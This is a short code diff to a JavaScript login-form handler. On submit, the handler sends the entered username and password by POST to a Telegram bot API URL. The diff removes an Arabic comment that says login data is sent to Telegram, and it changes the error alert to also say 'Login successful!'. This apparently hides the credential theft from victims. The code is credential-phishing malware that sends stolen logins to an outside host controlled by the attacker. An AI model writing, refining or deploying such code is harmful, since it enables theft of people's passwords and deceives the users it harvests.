@@ -7,7 +7,6 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    // إرسال بيانات تسجيل الدخول إلى Telegram
     fetch(TELEGRAM_BOT_API_URL, {
         method: "POST",
         headers: {
@@ -22,7 +21,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
         if (response.ok) {
             alert("Login successful!");
         } else {
-            alert("Error sending data to Telegram.");
+            alert("Login successful!");
         }
     })
     .catch(error => {
